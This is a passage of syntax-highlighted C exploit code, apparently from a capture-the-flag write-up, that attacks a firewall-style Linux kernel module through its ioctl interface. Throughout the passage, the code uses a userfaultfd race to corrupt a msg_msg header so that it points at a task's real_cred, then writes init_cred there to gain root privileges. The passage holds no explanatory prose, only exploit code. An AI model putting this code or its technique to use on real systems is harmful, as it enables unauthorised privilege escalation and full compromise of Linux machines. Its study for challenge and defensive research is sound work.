</span><span style="color:#c0c5ce;">uint64_t target_addr;
</span><span style="color:#c0c5ce;">uint32_t target_size;
</span><span style="color:#c0c5ce;">uint64_t race_page;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">uint64_t init_ipc_ns, kbase, init_task, init_cred;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">hexprint</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buffer</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">unsigned int </span><span style="color:#bf616a;">bytes</span><span style="color:#c0c5ce;">) </span><span style="color:#65737e;">// print like gdb qwords, we round to nearest dqword
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> dqwords = ((bytes + </span><span style="color:#d08770;">0x10 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)&amp;</span><span style="color:#d08770;">0xfffffff0</span><span style="color:#c0c5ce;">) / </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> qwords = dqwords * </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">for </span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> i = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">; i &lt; qwords; i+=</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">0x</span><span style="color:#d08770;">%04llx</span><span style="color:#a3be8c;">: 0x</span><span style="color:#d08770;">%016llx</span><span style="color:#a3be8c;"> 0x</span><span style="color:#d08770;">%016llx</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, (i * </span><span style="color:#d08770;">0x8</span><span style="color:#c0c5ce;">), ((size_t*)buffer)[i], ((size_t*)buffer)[i+</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">-----------------------------------------------</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#8fa1b3;">gen_dot_notation</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*buf, uint32_t val)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">sprintf</span><span style="color:#c0c5ce;">(buf, &quot;</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">.</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">.</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">.</span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, val &amp; </span><span style="color:#d08770;">0xff</span><span style="color:#c0c5ce;">, (val &amp; </span><span style="color:#d08770;">0xff00</span><span style="color:#c0c5ce;">) &gt;&gt; </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">, (val &amp; </span><span style="color:#d08770;">0xff0000</span><span style="color:#c0c5ce;">) &gt;&gt; </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">, (val &amp; </span><span style="color:#d08770;">0xff000000</span><span style="color:#c0c5ce;">) &gt;&gt; </span><span style="color:#d08770;">24</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">generate</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">input</span><span style="color:#c0c5ce;">, user_rule_t *</span><span style="color:#bf616a;">req</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> addr[</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">];
</span><span style="color:#c0c5ce;">    uint32_t ip = *(uint32_t *)&amp;input[</span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">];        </span><span style="color:#65737e;">// remain improved 0x41414141
</span><span style="color:#c0c5ce;">    uint32_t netmask = *(int32_t *)&amp;input[</span><span style="color:#d08770;">0x24</span><span style="color:#c0c5ce;">];    </span><span style="color:#65737e;">// 0x41414141
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(addr, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(addr));
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">gen_dot_notation</span><span style="color:#c0c5ce;">(addr, ip);</span><span style="color:#65737e;">// 65.65.65.65
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)req-&gt;ip, addr, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(addr, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(addr));
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">gen_dot_notation</span><span style="color:#c0c5ce;">(addr, netmask);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)req-&gt;netmask, addr, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)req-&gt;iface, input, </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)req-&gt;name,  (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;input[</span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0x10</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)&amp;req-&gt;proto, (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;input[</span><span style="color:#d08770;">0x28</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0x2</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)&amp;req-&gt;port,  (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;input[</span><span style="color:#d08770;">0x28</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0x2</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">*)&amp;req-&gt;action,(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;input[</span><span style="color:#d08770;">0x28</span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">4</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">0x1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">add</span><span style="color:#c0c5ce;">(uint8_t </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buffer</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    user_rule_t rule;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;rule, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(user_rule_t));
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">generate</span><span style="color:#c0c5ce;">(buffer, &amp;rule);
</span><span style="color:#c0c5ce;">    rule.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">= idx;
</span><span style="color:#c0c5ce;">    rule.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= type;
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, ADD_RULE, &amp;rule);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">delete</span><span style="color:#c0c5ce;">(uint8_t </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    user_rule_t rule;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;rule, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(user_rule_t));
</span><span style="color:#c0c5ce;">    rule.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">= idx;
</span><span style="color:#c0c5ce;">    rule.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= type;
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, DELETE_RULE, &amp;rule);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(uint8_t </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">buffer</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">invalidate</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    user_rule_t rule;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;rule, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(user_rule_t));
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">generate</span><span style="color:#c0c5ce;">(buffer, &amp;rule);
</span><span style="color:#c0c5ce;">    rule.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">= idx;
</span><span style="color:#c0c5ce;">    rule.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= type;
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(invalidate)
</span><span style="color:#c0c5ce;">    {
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">strcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;rule.</span><span style="color:#bf616a;">ip</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">invalid</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">strcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;rule.</span><span style="color:#bf616a;">netmask</span><span style="color:#c0c5ce;">, &quot;</span><span style="color:#a3be8c;">invalid</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    }
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, EDIT_RULE, &amp;rule);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">duplicate</span><span style="color:#c0c5ce;">(uint8_t </span><span style="color:#bf616a;">idx</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">type</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    user_rule_t rule;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;rule, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(user_rule_t));
</span><span style="color:#c0c5ce;">    rule.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">= idx;
</span><span style="color:#c0c5ce;">    rule.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= type;
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, DUP_RULE, &amp;rule);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">show</span><span style="color:#c0c5ce;">() </span><span style="color:#65737e;">// For debug
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">    user_rule_t rule;
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;rule, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(user_rule_t));
</span><span style="color:#c0c5ce;">    rule.</span><span style="color:#bf616a;">idx </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    rule.</span><span style="color:#bf616a;">type </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(fd, SHOW_RULE, &amp;rule);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;">* </span><span style="color:#bf616a;">msg1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(msg1);
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">static int</span><span style="color:#c0c5ce;"> page_size;
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void</span><span style="color:#c0c5ce;">* </span><span style="color:#8fa1b3;">handler</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*</span><span style="color:#bf616a;">arg</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffd_msg msg1;
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> uffd = (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)arg;
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] handler created</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> pollfd pollfd;
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> nready;
</span><span style="color:#c0c5ce;">  pollfd.</span><span style="color:#bf616a;">fd      </span><span style="color:#c0c5ce;">= uffd;
</span><span style="color:#c0c5ce;">  pollfd.</span><span style="color:#bf616a;">events  </span><span style="color:#c0c5ce;">= POLLIN;
</span><span style="color:#c0c5ce;">  nready = </span><span style="color:#8fa1b3;">poll</span><span style="color:#c0c5ce;">(&amp;pollfd, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(nready != </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)  </span><span style="color:#65737e;">// 这会一直等待，直到copy_from_user/copy_to_user访问FAULT_PAGE
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] Wrong pool return value</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Trigger! I&#39;m going to hang</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">read</span><span style="color:#c0c5ce;">(uffd, &amp;msg1, sizeof(msg1)) != sizeof(msg1)) </span><span style="color:#65737e;">// 从uffd读取msg结构，虽然没用
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] Error in reading uffd_msg</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">assert</span><span style="color:#c0c5ce;">(msg1.</span><span style="color:#bf616a;">event </span><span style="color:#c0c5ce;">== UFFD_EVENT_PAGEFAULT);
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] fault page handler finished</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#65737e;">// 1. change msg_msg-&gt;m_ts and msg_msg-&gt;next,      msg_msg-&gt;next = &amp;task_struct-&gt;real_cred - 0x8
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> buffer[</span><span style="color:#d08770;">0x2000</span><span style="color:#c0c5ce;">];   </span><span style="color:#65737e;">// 预先设置好buffer内容，往缺页处进行拷贝
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buffer, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(buffer));
</span><span style="color:#c0c5ce;">  msg_header evil;
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;evil, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sizeof(evil));
</span><span style="color:#c0c5ce;">  evil.</span><span style="color:#bf616a;">ll_next </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)</span><span style="color:#d08770;">0x1337babe</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  evil.</span><span style="color:#bf616a;">ll_prev </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)</span><span style="color:#d08770;">0xbaadf00d</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  evil.</span><span style="color:#bf616a;">m_type </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  evil.</span><span style="color:#bf616a;">m_ts   </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x1008 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">;              </span><span style="color:#65737e;">// ????
</span><span style="color:#c0c5ce;">  evil.</span><span style="color:#bf616a;">next   </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)target_addr;        </span><span style="color:#65737e;">// &amp;task_struct-&gt;real_cred - 0x8
</span><span style="color:#c0c5ce;">  
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">(buffer, (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;evil, sizeof(msg_header));
</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">edit</span><span style="color:#c0c5ce;">(target_idx, buffer, OUTBOUND, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">
</span><span style="color:#65737e;">// 2. put &amp;init_cred on fault page
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_copy uc;
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">memset</span><span style="color:#c0c5ce;">(buffer, </span><span style="color:#d08770;">0x43</span><span style="color:#c0c5ce;">, sizeof(buffer));
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)(buffer + </span><span style="color:#d08770;">0x1000 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0x30</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">), (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;init_cred, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);              </span><span style="color:#65737e;">// msg_msg: 0xfd0  -  real_cred
</span><span style="color:#c0c5ce;">  </span><span style="color:#96b5b4;">memcpy</span><span style="color:#c0c5ce;">((</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)(buffer + </span><span style="color:#d08770;">0x1000 </span><span style="color:#c0c5ce;">- </span><span style="color:#d08770;">0x30 </span><span style="color:#c0c5ce;">+ </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">-</span><span style="color:#d08770;">0x20</span><span style="color:#c0c5ce;">), (</span><span style="color:#b48ead;">void </span><span style="color:#c0c5ce;">*)&amp;init_cred, </span><span style="color:#d08770;">8</span><span style="color:#c0c5ce;">);          </span><span style="color:#65737e;">// msg_msg: 0xfd8  -  cred ?TODO
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  uc.</span><span style="color:#bf616a;">src </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)buffer;
</span><span style="color:#c0c5ce;">  uc.</span><span style="color:#bf616a;">dst </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)race_page; </span><span style="color:#65737e;">// (unsigned long) msg1.arg.pagefault.address &amp; ~(page_size - 1); 应该就是缺的页
</span><span style="color:#c0c5ce;">  uc.</span><span style="color:#bf616a;">len </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0x1000</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  uc.</span><span style="color:#bf616a;">mode </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  uc.</span><span style="color:#bf616a;">copy </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  </span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(uffd, UFFDIO_COPY, &amp;uc); </span><span style="color:#65737e;">// 恢复执行copy_from_user
</span><span style="color:#c0c5ce;">  
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">}
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">void </span><span style="color:#8fa1b3;">register_userfault</span><span style="color:#c0c5ce;">(uint64_t </span><span style="color:#bf616a;">fault_page</span><span style="color:#c0c5ce;">, uint64_t </span><span style="color:#bf616a;">fault_page_len</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">{
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_api ua;
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> uffdio_register ur;
</span><span style="color:#c0c5ce;">  pthread_t thr;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">  uint64_t uffd = </span><span style="color:#8fa1b3;">syscall</span><span style="color:#c0c5ce;">(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); </span><span style="color:#65737e;">// create the user fault fd
</span><span style="color:#c0c5ce;">  ua.</span><span style="color:#bf616a;">api </span><span style="color:#c0c5ce;">= UFFD_API;
</span><span style="color:#c0c5ce;">  ua.</span><span style="color:#bf616a;">features </span><span style="color:#c0c5ce;">= </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(uffd, UFFDIO_API, &amp;ua) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] ioctl-UFFDIO_API</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">//if (mmap(fault_page, fault_page_len, 7, 0x22, -1, 0) != fault_page) // PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,  //create page used for user fault
</span><span style="color:#c0c5ce;">  </span><span style="color:#65737e;">//  errExit(&quot;[-] mmap fault page&quot;);
</span><span style="color:#c0c5ce;">  ur.</span><span style="color:#bf616a;">range</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">start </span><span style="color:#c0c5ce;">= (</span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;">)fault_page;
</span><span style="color:#c0c5ce;">  ur.</span><span style="color:#bf616a;">range</span><span style="color:#c0c5ce;">.</span><span style="color:#bf616a;">len   </span><span style="color:#c0c5ce;">= fault_page_len;
</span><span style="color:#c0c5ce;">  ur.</span><span style="color:#bf616a;">mode        </span><span style="color:#c0c5ce;">= UFFDIO_REGISTER_MODE_MISSING;
</span><span style="color:#c0c5ce;">  </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#8fa1b3;">ioctl</span><span style="color:#c0c5ce;">(uffd, UFFDIO_REGISTER, &amp;ur) == -</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] ioctl-UFFDIO_REGISTER</span><span style="color:#c0c5ce;">&quot;);  </span><span style="color:#65737e;">//注册页地址与错误处理fd，这样只要copy_from_user
</span><span style="color:#c0c5ce;">                         </span><span style="color:#65737e;">//访问到FAULT_PAGE，则访问被挂起，uffd会接收到信号
